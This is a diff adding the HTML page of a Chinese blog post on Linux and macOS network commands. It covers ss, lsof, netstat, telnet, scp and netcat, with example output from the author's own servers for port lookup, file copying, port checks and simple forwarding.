@@ -1,0 +1,1097 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="29vLVh4vA4suQh5SRMCfQisJ8UugXBkjM46VFkYeonU">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="linux网络命令,mac网络命令,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="##  网络连接 - ip port pid 网络传输 - 数据:文件、对话 网络状况 - cpu io mem 网络下载 - 文件 网络监控 - tcp   网络连接 - ip port pidss - socket statisticsDescription: ss is used to dump socket statistics. It allows showing information">
+<meta name="keywords" content="linux网络命令,mac网络命令">
+<meta property="og:type" content="article">
+<meta property="og:title" content="linux mac 网络相关命令">
+<meta property="og:url" content="https://yaoyuanyy.github.io/2021/01/24/linux-mac-网络相关命令分类/index.html">
+<meta property="og:site_name" content="skyler-blog">
+<meta property="og:description" content="##  网络连接 - ip port pid 网络传输 - 数据:文件、对话 网络状况 - cpu io mem 网络下载 - 文件 网络监控 - tcp   网络连接 - ip port pidss - socket statisticsDescription: ss is used to dump socket statistics. It allows showing information">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/yaoyuanyy/MarkdownPhotos/master/img/20210128233603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/yaoyuanyy/MarkdownPhotos/master/img/20210130202240.png">
+<meta property="og:updated_time" content="2021-02-03T08:49:43.112Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="linux mac 网络相关命令">
+<meta name="twitter:description" content="##  网络连接 - ip port pid 网络传输 - 数据:文件、对话 网络状况 - cpu io mem 网络下载 - 文件 网络监控 - tcp   网络连接 - ip port pidss - socket statisticsDescription: ss is used to dump socket statistics. It allows showing information">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/yaoyuanyy/MarkdownPhotos/master/img/20210128233603.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yaoyuanyy.github.io/2021/01/24/linux-mac-网络相关命令分类/">
+
+
+
+
+
+  <title>linux mac 网络相关命令 | skyler-blog</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?94ae7654e2dc1739de6dffa8904d5c82";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">skyler-blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yaoyuanyy.github.io/2021/01/24/linux-mac-网络相关命令分类/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Skyler">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/tao.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="skyler-blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">linux mac 网络相关命令</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-01-24T23:49:31+08:00">
+                2021-01-24
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2021-02-03T16:49:43+08:00">
+                2021-02-03
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/linux/" itemprop="url" rel="index">
+                    <span itemprop="name">linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2021/01/24/linux-mac-网络相关命令分类/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2021/01/24/linux-mac-网络相关命令分类/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2021/01/24/linux-mac-网络相关命令分类/" class="leancloud_visitors" data-flag-title="linux mac 网络相关命令">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  3.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  14
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>##</p>
+<ul>
+<li>网络连接 - ip port pid</li>
+<li>网络传输 - 数据:文件、对话</li>
+<li>网络状况 - cpu io mem</li>
+<li>网络下载 - 文件</li>
+<li>网络监控 - tcp </li>
+</ul>
+<h2 id="网络连接-ip-port-pid"><a href="#网络连接-ip-port-pid" class="headerlink" title="网络连接 - ip port pid"></a>网络连接 - ip port pid</h2><h3 id="ss-socket-statistics"><a href="#ss-socket-statistics" class="headerlink" title="ss - socket statistics"></a>ss - socket statistics</h3><p>Description: ss is used to dump socket statistics. It allows showing information similar to netstat.  It can display more TCP and state informations than other tools</p>
+<p>查看网络连接，代替netstat命令，使用更简洁。NOTE: mac上默认是没有的，需要额外安装。<br>常用命令参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-a 拉取所有socket（包括tcp、udp、unix sock等）</span><br><span class="line">-n 不将IP、端口等解析为名称</span><br><span class="line">-p 显示连接关联的进程信息（可能需要root权限）</span><br><span class="line">-l 显示监听状态的套接字（sockets）</span><br><span class="line">-t 仅显示 TCP套接字（sockets）</span><br><span class="line">-u 仅显示 UCP套接字（sockets）</span><br><span class="line">-x 只显示unix sock连接</span><br><span class="line">-s, --summary 显示套接字（socket）使用概况</span><br></pre></td></tr></table></figure></p>
+<p>常用ss命令<br><img src="https://raw.githubusercontent.com/yaoyuanyy/MarkdownPhotos/master/img/20210128233603.png" alt="20210128233603"></p>
+<blockquote>
+<p><code>ss</code> 真正耀眼的地方是其内置的过滤能力</p>
+</blockquote>
+<p>只想看已建立的 socket（排除了 <em>listening</em> 和 <em>closed</em> ）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ss state connected sport = :ssh</span><br><span class="line">Netid State      Recv-Q Send-Q     Local Address:Port                      Peer Address:Port</span><br><span class="line">tcp   ESTAB      0      0          192.168.0.136:ssh                      192.168.0.102:46540</span><br><span class="line"></span><br><span class="line">参考：[ss命令使用详解](http://www.ttlsa.com/linux-command/ss-replace-netstat/)</span><br></pre></td></tr></table></figure>
+<p>[root@aizbp11lqlgyf2g31fgs4hg ~]# ss -ptln<br>State      Recv-Q Send-Q     Local Address:Port       Peer Address:Port<br>LISTEN     0      128        <em>:ssh                    </em>:<em>                     users:((“sshd”,pid=1329,fd=3))<br>LISTEN     0      1          127.0.0.1:32000          </em>:*                     users:((“java”,pid=17595,fd=3))<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### lsof - list open files </span><br><span class="line">Description: lists on its standard output file information about files opened by processes</span><br><span class="line"></span><br><span class="line">常用命令参数</span><br></pre></td></tr></table></figure></p>
+<p>-i [:port @host]<br>-p 列出某个进程号所打开的文件信息<br>-c 列出某个程序所打开的文件信息<br>-u 列出某个用户打开的文件信息<br>-P 禁用端口号到端口名的转换<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用lsof命令举例</span><br></pre></td></tr></table></figure></p>
+<p>lsof -i:9902<br>lsof –<a href="mailto:i@10.65.64.23" target="_blank" rel="noopener">i@10.65.64.23</a><br>lsof -p 1122<br>lsof -u root<br>lsof -c mysql<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### netstat - 过时 </span><br><span class="line">NOTE: mac上默认是没有的，需要额外安装。即使安装，netstat的macOS版本缺少许多用户期望的功能，这时候可以使用lsof。即ss和lsof都可以替代netstat</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### telnet - 过时 </span><br><span class="line">telnet命令通常用来远程登录。但是，telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。</span><br><span class="line">但是telnet可以查看远程端口是否开启的方法</span><br></pre></td></tr></table></figure></p>
+<p>telnet ip port</p>
+<p>具有相同功能的还有<br>nc -z ip port 注释: -z是仅仅报告连接状态，不发送数据<br>nmap ip -p port<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 实战1 查看pid和服务端口的对应关系 - 通过pid查看port</span><br><span class="line"></span><br><span class="line">#### ss -ptln|grep 17470</span><br></pre></td></tr></table></figure></p>
+<p>[root@aizbp11lqlgyf2g31fgs4hg ~]# ss -ptln|grep 17470<br>LISTEN     0      100          <em>:20282                    </em>:*                   users:((“java”,pid=17470,fd=21))<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### lsof -i|grep pid 或者 lsof -i:port</span><br></pre></td></tr></table></figure></p>
+<p>[root@aizbp11lqlgyf2g31fgs4hg ~]# lsof -i:32000<br>COMMAND   PID USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME<br>wrapper  1105 root    6u  IPv4 53752676      0t0  TCP localhost:32000-&gt;localhost:31001 (ESTABLISHED)<br>java    17595 root    3u  IPv4 53752648      0t0  TCP localhost:32000 (LISTEN)<br>java    17595 root   28u  IPv4 53752674      0t0  TCP localhost:31001-&gt;localhost:32000 (ESTABLISHED)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
+<p>[work@VM_12_70_centos ~]$ lsof -i:9092<br>COMMAND   PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME<br>java     9316 work   45u  IPv4 514189572      0t0  TCP VM_12_70_centos:34588-&gt;VM_12_70_centos:XmlIpcRegSvc (ESTABLISHED)<br>java     9316 work   46u  IPv4 514194500      0t0  TCP VM_12_70_centos:34600-&gt;VM_12_70_centos:XmlIpcRegSvc (ESTABLISHED)<br>java    29134 work  103u  IPv4 514193492      0t0  TCP VM_12_70_centos:XmlIpcRegSvc (LISTEN)<br>java    29134 work  113u  IPv4 514192570      0t0  TCP VM_12_70_centos:XmlIpcRegSvc-&gt;VM_12_70_centos:34588 (ESTABLISHED)<br>java    29134 work  172u  IPv4 514189578      0t0  TCP VM_12_70_centos:XmlIpcRegSvc-&gt;VM_12_70_centos:34600 (ESTABLISHED)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里需要注意下&apos;lsof -i:32000&apos; 和 &apos;lsof -i:9092&apos;打印信息的区别，32000的显示的正常的端口号，9092显示的却是XmlIpcRegSvc，你可能会疑问，请参见：[server name与port对应关系]https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?skey=7&amp;page=83 ，为了一直显示端口号，&apos;ss&apos; 和&apos;lsof&apos; 都提供了相应的命令参数 &apos;ss -n&apos; 和&apos;lsof -P&apos;。我们再来看下效果：</span><br></pre></td></tr></table></figure></p>
+<p>[work@VM_12_70_centos ~]$ lsof -P -i:9092<br>COMMAND   PID USER   FD   TYPE    DEVICE SIZE/OFF NODE NAME<br>java     9316 work   45u  IPv4 514189572      0t0  TCP VM_12_70_centos:34588-&gt;VM_12_70_centos:9092 (ESTABLISHED)<br>java     9316 work   46u  IPv4 514194500      0t0  TCP VM_12_70_centos:34600-&gt;VM_12_70_centos:9092 (ESTABLISHED)<br>java    29134 work  103u  IPv4 514193492      0t0  TCP VM_12_70_centos:9092 (LISTEN)<br>java    29134 work  113u  IPv4 514192570      0t0  TCP VM_12_70_centos:9092-&gt;VM_12_70_centos:34588 (ESTABLISHED)<br>java    29134 work  172u  IPv4 514189578      0t0  TCP VM_12_70_centos:9092-&gt;VM_12_70_centos:34600 (ESTABLISHED)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">所以，查看pid和服务端口的对应关系的方式是：1. &apos;ss -ptln|grep pid|port&apos; ; 2. &apos;lsof -P -i|grep pid 或者 lsof -P -i:port&apos;</span><br><span class="line"></span><br><span class="line">#### 实战2 想知道java web服务的端口</span><br><span class="line">step1: ps -ef|grep $&#123;服务名&#125;</span><br></pre></td></tr></table></figure></p>
+<p>[work@centos ~]$ ps -ef|grep -v grep|grep microservice<br>work      9316     1  0  2020 ?        08:41:46 java -Dspring.profiles.active=test -Dserver.port=9998 -jar /home/microservice-1.0.0-SNAPSHOT.jar<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">step2:</span><br></pre></td></tr></table></figure></p>
+<p>[work@centos ~]$ ss -lptn |grep 9316<br>LISTEN     0      1            <em>:5005                     </em>:<em>                   users:((“java”,pid=9316,fd=5))<br>LISTEN     0      100          </em>:9998                     <em>:</em>                   users:((“java”,pid=9316,fd=35))<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">或者</span><br></pre></td></tr></table></figure></p>
+<p>[work@centos ~]$ lsof -P -i|grep 9316<br>java     9316 work   35u  IPv4 1111111      0t0  TCP *:9998 (LISTEN)<br>NOTE: 这里的distinct32其实就是9998端口，原因参见上一个NOTE<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">## 网络传输 - 数据:文件、对话</span><br><span class="line"></span><br><span class="line">NOTE: scp使用ssh安全协议传输数据，具有和ssh一样的验证机制，从而可以实现安全的远程拷贝文件。nc传输时没有这么安全</span><br><span class="line"></span><br><span class="line">### scp - secure copy</span><br><span class="line">DESCRIPTION: scp copies files between hosts on a network</span><br><span class="line"></span><br><span class="line">不同机器上远程拷贝文件</span><br><span class="line"></span><br><span class="line">常用命令参数</span><br></pre></td></tr></table></figure></p>
+<p>-r  递归复制整个目录。<br>-v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。<br>-C 采用gzip压缩方式 传输，这样传输更快<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">常用scp命令 </span><br><span class="line">假设现在有A B两台机器，A是本地电脑，B是远程机器。scp可以从两个方向进行操作：在A上下载B的文件；</span><br><span class="line">从本地服务器上传文件/目录到远程服务器：</span><br><span class="line">``` </span><br><span class="line">上传文件 scp local_file remote_username@remote_ip:remote_folder </span><br><span class="line"> </span><br><span class="line">上传目录 scp -r local_folder remote_username@remote_ip:remote_folder</span><br></pre></td></tr></table></figure></p>
+<p>实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scp /opt/soft/nginx-0.5.38.tar.gz root@10.80.100.20:/opt/soft/scptest</span><br><span class="line">说明：</span><br><span class="line">复制本地opt/soft/目录下的文件nginx-0.5.38.tar.gz 到远程机器10.80.100.20的opt/soft/scptest目录</span><br><span class="line"></span><br><span class="line">scp -r /opt/soft/mongodb root@10.80.100.20:/opt/soft/scptest</span><br><span class="line">说明：</span><br><span class="line">复制本地opt/soft/mongodb 目录到远程机器10.80.100.20的opt/soft/scptest目录中</span><br></pre></td></tr></table></figure></p>
+<p>从本地服务器下载远程服务器的文件/目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载文件 scp remote_username@remote_ip:remote_file  local_folder</span><br><span class="line"></span><br><span class="line">下载目录 scp -r remote_username@remote_ip:remote_folder local_folder</span><br></pre></td></tr></table></figure></p>
+<p>实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scp root@10.80.100.20:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/</span><br><span class="line">说明：</span><br><span class="line">从10.80.100.20机器上的/opt/soft/的目录中下载nginx-0.5.38.tar.gz 文件到本地/opt/soft/目录中</span><br><span class="line"></span><br><span class="line">scp -r root@10.80.100.20:/opt/soft/mongodb /opt/soft/</span><br><span class="line">说明：</span><br><span class="line">从10.80.100.20机器上的/opt/soft/中下载mongodb目录到本地的/opt/soft/目录来。</span><br></pre></td></tr></table></figure></p>
+<h3 id="nc-arbitrary-任意的-TCP-and-UDP-connections-and-listens"><a href="#nc-arbitrary-任意的-TCP-and-UDP-connections-and-listens" class="headerlink" title="nc - arbitrary(任意的) TCP and UDP connections and listens"></a>nc - arbitrary(任意的) TCP and UDP connections and listens</h3><p>DESCRIPTION:<br>     The nc (or netcat) utility is used for just about anything under the sun involving TCP or UDP.  It can open TCP connections, send UDP packets, listen on<br>arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6</p>
+<p>既可以网络调试又数据传输, 既是一个端口扫描工具，也是一款安全工具，还能是一款监测工具，甚至可以做为一个简单的 TCP 代理。 由于有这么多的功能，它被誉为是网络界的瑞士军刀</p>
+<h4 id="常用命令参数"><a href="#常用命令参数" class="headerlink" title="常用命令参数"></a>常用命令参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-v：显示指令执行过程；</span><br><span class="line">-z：只显示连接状态，不发送数据，只在扫描通信端口时使用。</span><br><span class="line">-w2：超时时间。设置等待连线的时间为2s；</span><br></pre></td></tr></table></figure>
+<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="使用netcat实现聊天"><a href="#使用netcat实现聊天" class="headerlink" title="使用netcat实现聊天"></a>使用netcat实现聊天</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">20.90.189.37机器，监听80端口(注意:我这里是aliyun服务器，他的安全策略是只开放了80等端口，你使用其他端口可能无法实现聊天，这是因为阿里云的安全策略控制的，你需要配置你使用的端口)</span><br><span class="line">接收端启动监听</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 80</span><br><span class="line">ff</span><br><span class="line">dfgdfg</span><br><span class="line"></span><br><span class="line">发送端(mac机器)连接20.90.189.37机器的80端口</span><br><span class="line">[test@mac ~]# nc 20.90.189.37 80</span><br><span class="line">ff</span><br><span class="line">dfgdfg</span><br><span class="line"></span><br><span class="line">输入ff、dfgdfg可以看到消息已经相互传递了。断开时需要手动Ctrl + c</span><br></pre></td></tr></table></figure>
+<h4 id="使用netcat实现文件传输1"><a href="#使用netcat实现文件传输1" class="headerlink" title="使用netcat实现文件传输1"></a>使用netcat实现文件传输1</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@izbp10lqlgy2g31s41bt94z ~]# nc -l 80 &gt; test.sh</span><br><span class="line">[root@izbp10lqlgy2g31s41bt94z ~]# ll</span><br><span class="line">-rw-r--r-- 1 root root     0 10月 29 10:37 test.sh</span><br><span class="line"></span><br><span class="line">[test@mac ~]# nc 20.90.189.37 80 &lt; test.sh</span><br><span class="line">传输完成，连接自动断开</span><br></pre></td></tr></table></figure>
+<h4 id="使用netcat进行远程端口扫描-即查看远程端口是否开启"><a href="#使用netcat进行远程端口扫描-即查看远程端口是否开启" class="headerlink" title="使用netcat进行远程端口扫描 - 即查看远程端口是否开启"></a>使用netcat进行远程端口扫描 - 即查看远程端口是否开启</h4><p>实例：nc -v -z -w2 192.168.31.164 1-100<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -v -z -w2 192.168.31.164 38322</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Connection timed out.</span><br></pre></td></tr></table></figure></p>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">端口转发</span><br><span class="line">我们通过选项 -c 来用 nc 进行端口转发，实现端口转发的语法为：</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -u -l  80 -c  &apos;ncat -u -l 8080&apos;</span><br><span class="line"></span><br><span class="line">作为代理</span><br><span class="line">[root@aizbp11lqlgyf2g31fgsfhg ~]# nc -l 8080 | nc 192.168.1.200 80</span><br><span class="line">所有发往我们服务器 8080 端口的连接都会自动转发到 192.168.1.200 上的 80 端口。</span><br></pre></td></tr></table></figure>
